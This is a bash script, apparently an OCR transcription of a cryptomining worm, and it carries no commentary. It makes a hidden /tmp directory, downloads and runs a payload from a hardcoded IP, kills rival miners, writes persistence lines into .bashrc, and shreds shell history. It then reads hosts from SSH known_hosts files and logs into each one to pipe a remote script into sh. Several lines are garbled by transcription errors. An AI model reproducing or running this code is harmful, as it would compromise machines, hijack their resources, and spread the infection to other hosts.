#!/bin/bash
mkdir /tmp/.oyahoe
cd /tmp/.oyahoe
curl -o config.tar.gz 1.177.165.231/sd/T3llyz.tar.gz || wget -O config.tar.gz 1.177.165.231/sd/T3llyz.tar.gz
tar -xvf *
chmod 777 *
rm -rf *.gz
./*ba*
pkill -f xmrig
pkill -f docker-cache
pkill -f trace
echo ‘cd /tmp/.oyahoe; nohup ./*ba*; cd /; history -c' >> SHOME/.bashre
echo ‘pkill -f xmrig' >> SHOME/.bashrc
echo ‘pkill -£ docker-cache' >> SHOME/.bashre
echo ‘pkill -f trace' >> SHOME/.bashrc
history -c
shred -zuv S$HOME/.bash_history || rm -rf SHOME/.bash_history
if [ -£ /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
for h in S(grep -oE "\b([(0-9]{1,3}\.) {3} [0-9] {1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h ‘(curl
http://1.177.165.231/sd/T3llyz.shish || wget -q -O- http://1.177.165.231/sd/T3llyz.sh)|sh >/dev/null 2>&1 &' & done

fi
for file in /home/*
do

if test -d $file

then

if [ -f£ $file/.ssh/known_hosts ] && [ -f $file/.ssh/id_rsa.pub ]; then
for h in S(grep -oE "\b([(0-9]{1,3}\.) {3} [0-9] {1,3}\b" $file/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h ‘(curl
http://1.177.165.231/sd/T3llyz.shish || wget -q -O- http://1.177.165.231/sd/T3llyz.sh)|sh >/dev/null 2>&1 &' & done
fi

fi

done
